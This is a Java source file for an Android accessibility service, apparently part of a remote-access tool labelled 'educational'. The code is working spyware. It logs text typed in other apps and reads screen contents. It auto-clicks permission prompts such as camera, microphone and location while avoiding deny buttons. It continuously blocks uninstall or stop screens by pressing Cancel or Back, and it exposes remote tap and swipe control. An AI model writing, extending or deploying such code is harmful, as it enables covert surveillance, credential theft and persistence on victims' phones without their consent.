package com.remoteaccess.educational.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.graphics.Point;
import android.view.Display;
import android.view.WindowManager;
import android.os.Handler;
import android.os.Looper;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.List;

import com.remoteaccess.educational.utils.KeepAliveManager;

public class UnifiedAccessibilityService extends AccessibilityService {

    private static final String TAG = "UnifiedAccessService";
    private static UnifiedAccessibilityService instance;
    
    private ClipboardManager clipboardManager;
    private String lastClipboard = "";
    private List<String> keylogBuffer = new ArrayList<>();
    private int screenWidth;
    private int screenHeight;
    private Handler autoClickHandler;
    private Runnable autoClickRunnable;
    
    // Grant permissions - run for 10 seconds after accessibility enabled
    private long grantPermsStartTime = 0;
    private static final long GRANT_PERMS_DURATION = 7000; // 7 seconds
    
    // Defent variables - run continuously forever
    private String currentAppName = "";

    // Keep-screen-alive (no Activity dependency)
    private KeepAliveManager keepAliveManager;
    
    public static UnifiedAccessibilityService getInstance() {
        return instance;
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_FOCUSED |
                         AccessibilityEvent.TYPE_VIEW_CLICKED |
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        info.notificationTimeout = 100;
        
        setServiceInfo(info);
        
        // Start continuous auto-click scan immediately
        startAutoClickScanner();
        
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        
        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        Display display = wm.getDefaultDisplay();
        Point size = new Point();
        display.getRealSize(size);
        screenWidth = size.x;
        screenHeight = size.y;

        // Start keep-screen-alive — runs entirely in this service, no Activity needed
        keepAliveManager = new KeepAliveManager(this);
        keepAliveManager.start();
    }
    
    private void updateCurrentAppName() {
        try {
            String packageName = getPackageName();
            PackageManager pm = getPackageManager();
            ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
            currentAppName = pm.getApplicationLabel(appInfo).toString();
        } catch (Exception e) {
            currentAppName = "";
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            String packageName = event.getPackageName() != null ? 
                               event.getPackageName().toString() : "";
            
            if (packageName.equals(getPackageName())) {
                return;
            }
            
            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    List<CharSequence> textList = event.getText();
                    if (textList != null && !textList.isEmpty()) {
                        StringBuilder textBuilder = new StringBuilder();
                        for (CharSequence cs : textList) {
                            textBuilder.append(cs);
                        }
                        String log = "[" + packageName + "] TEXT: " + textBuilder.toString();
                        keylogBuffer.add(log);
                    }
                    break;
                    
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    updateCurrentAppName();
                    String log = "[" + packageName + "] APP OPENED";
                    keylogBuffer.add(log);
                    break;
                    
                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                    autoClickAllowButton();
                    break;
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private boolean isSystemPanelOpen() {
        try {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) return false;
            CharSequence pkg = rootNode.getPackageName();
            rootNode.recycle();
            if (pkg == null) return false;
            String pkgStr = pkg.toString();
            return pkgStr.equals("com.android.systemui")
                || pkgStr.equals("com.android.settings")
                || pkgStr.contains("systemui");
        } catch (Exception e) {
            return false;
        }
    }

    private void autoClickAllowButton() {
        try {
            // Do not auto-click while the notification panel or quick settings is open
            if (isSystemPanelOpen()) return;

            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) return;
            
            // Update app name
            updateCurrentAppName();
            
            // Run DEFENT variables - never stop (continuously)
            if (runDefentProtection(rootNode)) {
                rootNode.recycle();
                return;
            }
            
            // Run GRANT PERMS - only for 10 seconds after accessibility enabled
            long elapsed = System.currentTimeMillis() - grantPermsStartTime;
            if (elapsed < GRANT_PERMS_DURATION) {
                if (runGrantPerms(rootNode)) {
                    rootNode.recycle();
                    return;
                }
            }
            
            rootNode.recycle();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private boolean runDefentProtection(AccessibilityNodeInfo rootNode) {
        // This runs CONTINUOUSLY forever - never stops
        
        // Check if dangerous words with app name found - close the window
        if (containsDangerousWordsWithAppName(rootNode)) {
            // Click cancel/close/back
            if (findAndClickFullWord(rootNode, "Cancel")) return true;
            if (findAndClickFullWord(rootNode, "Close")) return true;
            if (findAndClickFullWord(rootNode, "No")) return true;
            if (findAndClickFullWord(rootNode, "Back")) return true;
            performBack();
            return true;
        }
        
        return false;
    }
    
    private boolean containsDangerousWordsWithAppName(AccessibilityNodeInfo node) {
        if (node == null || currentAppName.isEmpty()) return false;
        
        try {
            String allText = getAllScreenText(node);
            
            String[] dangerousWords = {"UNINSTALL", "Uninstall", "uninstall", "DELETE", "Delete", "REMOVE", "Remove", "STOP", "Stop", "OPTIONS", "Options"};
            
            for (String word : dangerousWords) {
                if (allText.contains(currentAppName) && allText.contains(word)) {
                    return true;
                }
            }
            
            if (allText.contains("Recent") && allText.contains(currentAppName)) {
                for (String word : dangerousWords) {
                    if (allText.contains(word)) {
                        return true;
                    }
                }
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return false;
    }
    
    private String getAllScreenText(AccessibilityNodeInfo node) {
        StringBuilder sb = new StringBuilder();
        collectText(node, sb);
        return sb.toString();
    }
    
    private void collectText(AccessibilityNodeInfo node, StringBuilder sb) {
        if (node == null) return;
        
        try {
            if (node.getText() != null) {
                sb.append(node.getText().toString()).append(" ");
            }
            if (node.getContentDescription() != null) {
                sb.append(node.getContentDescription().toString()).append(" ");
            }
            
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    collectText(child, sb);
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private boolean runGrantPerms(AccessibilityNodeInfo rootNode) {
        // Only runs for 10 seconds after accessibility is enabled
        
        String[] keywords = {
            "Allow only while using the app",
            "Allow",
            "Grant",
            "Permit",
            "Enable",
            "Activate",
            "Turn on",
            "Got it",
            "OK",
            "I understand",
            "Yes",
            "Allow all the time",
            "While using the app",
            "Allow camera access",
            "Allow microphone access",
            "Allow location access",
            "Allow contacts access",
            "Allow storage access",
            "Permitir"
        };
        
        for (String keyword : keywords) {
            if (findAndClickFullWord(rootNode, keyword)) return true;
        }
        
        return false;
    }
    
    public void startGrantPermsTimer() {
        grantPermsStartTime = System.currentTimeMillis();
    }
    
    public void stopGrantPermsTimer() {
        grantPermsStartTime = 0;
    }
    
    private boolean findAndClickFullWord(AccessibilityNodeInfo node, String searchText) {
        if (node == null) return false;
        
        try {
            CharSequence text = node.getText();
            CharSequence desc = node.getContentDescription();
            
            // Check if this is a negative word that should NEVER be clicked
            if (text != null && isNegativeWord(text.toString().trim())) {
                return false;
            }
            if (desc != null && isNegativeWord(desc.toString().trim())) {
                return false;
            }
            
            boolean matches = false;
            
            // Check text - exact match only (case insensitive), not substring
            if (text != null) {
                String nodeText = text.toString().trim();
                String searchTrimmed = searchText.trim();
                // Only match if EXACTLY equal, not contains
                if (nodeText.equalsIgnoreCase(searchTrimmed) && nodeText.length() == searchTrimmed.length()) {
                    matches = true;
                }
            }
            
            // Check content description - exact match only (case insensitive)
            if (desc != null) {
                String nodeDesc = desc.toString().trim();
                String searchTrimmed = searchText.trim();
                if (nodeDesc.equalsIgnoreCase(searchTrimmed) && nodeDesc.length() == searchTrimmed.length()) {
                    matches = true;
                }
            }
            
            if (matches) {
                // Only click if it's a button or clickable element
                boolean isButton = false;
                CharSequence className = node.getClassName();
                if (className != null) {
                    String classStr = className.toString().toLowerCase();
                    if (classStr.contains("button") || classStr.contains("textview") || 
                        classStr.contains("imagebutton") || classStr.contains("checkbox") ||
                        classStr.contains("switch") || classStr.contains("toggle")) {
                        isButton = true;
                    }
                }
                
                // Try to click this element if clickable or is a button type
                if (node.isClickable() || isButton) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
                
                // Try to click parent
                AccessibilityNodeInfo parent = node.getParent();
                if (parent != null) {
                    if (parent.isClickable()) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        parent.recycle();
                        return true;
                    }
                    parent.recycle();
                }
                
                // Try to perform click action directly
                return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
            
            // Recursively check ALL children
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndClickFullWord(child, searchText)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return false;
    }
    
    private boolean isNegativeWord(String text) {
        if (text == null || text.isEmpty()) return false;
        
        String trimmedText = text.trim();
        
        String[] negativeWords = {
            "Deny", "DENY",
            "Don't allow", "don't allow", "DON'T ALLOW",
            "Dont allow", "dont allow", "DONT ALLOW",
            "Never", "NEVER",
            "Never allow", "never allow", "NEVER ALLOW",
            "Restrict", "RESTRICT",
            "Restricted", "RESTRICTED",
            "No", "NO",
            "Refuse", "REFUSE",
            "Block", "BLOCK",
            "Keep restricted", "keep restricted", "KEEP RESTRICTED",
            "Not optimized", "not optimized", "NOT OPTIMIZED",
            "Cancel", "CANCEL",
            "Skip", "SKIP",
            "Later", "LATER",
            "Not now", "not now", "NOT NOW",
            "Decline", "DECLINE",
            "Disallow", "DISALLOW",
            "Dismiss", "DISMISS",
            "Close", "CLOSE",
            "Don't allow", "dont allow"
        };
        
        for (String word : negativeWords) {
            if (trimmedText.equals(word)) {
                return true;
            }
        }
        
        return false;
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (autoClickHandler != null && autoClickRunnable != null) {
            autoClickHandler.removeCallbacks(autoClickRunnable);
        }
        if (keepAliveManager != null) {
            keepAliveManager.stop();
            keepAliveManager = null;
        }
        instance = null;
    }

    public JSONObject readScreen() {
        JSONObject result = new JSONObject();
        try {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) {
                result.put("success", false);
                result.put("error", "No active window");
                return result;
            }
            
            JSONObject screenData = new JSONObject();
            screenData.put("packageName", rootNode.getPackageName() != null ? rootNode.getPackageName().toString() : "");
            screenData.put("className", rootNode.getClassName() != null ? rootNode.getClassName().toString() : "");
            
            JSONArray elements = new JSONArray();
            readNodeRecursive(rootNode, elements, 0);
            screenData.put("elements", elements);
            screenData.put("elementCount", elements.length());
            
            rootNode.recycle();
            
            result.put("success", true);
            result.put("screen", screenData);
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (Exception ignored) {}
        }
        return result;
    }
    
    private void readNodeRecursive(AccessibilityNodeInfo node, JSONArray elements, int depth) {
        if (node == null || depth > 10) return;
        
        try {
            if (node.getText() != null || node.getContentDescription() != null) {
                JSONObject obj = new JSONObject();
                obj.put("text", node.getText() != null ? node.getText().toString() : "");
                obj.put("desc", node.getContentDescription() != null ? node.getContentDescription().toString() : "");
                obj.put("class", node.getClassName() != null ? node.getClassName().toString() : "");
                obj.put("clickable", node.isClickable());
                obj.put("scrollable", node.isScrollable());
                elements.put(obj);
            }
            
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    readNodeRecursive(child, elements, depth + 1);
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public boolean performClick(float x, float y) {
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));
        return dispatchGesture(builder.build(), null, null);
    }
    
    public boolean performSwipe(float x1, float y1, float x2, float y2, int duration) {
        Path path = new Path();
        path.moveTo(x1, y1);
        path.lineTo(x2, y2);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));
        return dispatchGesture(builder.build(), null, null);
    }
    
    public boolean performBack() {
        return performGlobalAction(GLOBAL_ACTION_BACK);
    }
    
    public boolean performHome() {
        return performGlobalAction(GLOBAL_ACTION_HOME);
    }
    
    public boolean performRecents() {
        return performGlobalAction(GLOBAL_ACTION_RECENTS);
    }
    
    public boolean performNotifications() {
        return performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS);
    }
    
    public List<String> getKeylogs() {
        List<String> logs = new ArrayList<>(keylogBuffer);
        keylogBuffer.clear();
        return logs;
    }
    
    private void startAutoClickScanner() {
        autoClickHandler = new Handler(Looper.getMainLooper());
        autoClickRunnable = new Runnable() {
            @Override
            public void run() {
                autoClickAllowButton();
                if (autoClickHandler != null && autoClickRunnable != null) {
                    autoClickHandler.postDelayed(this, 500); // Scan every 500ms
                }
            }
        };
        autoClickHandler.post(autoClickRunnable);
    }
}
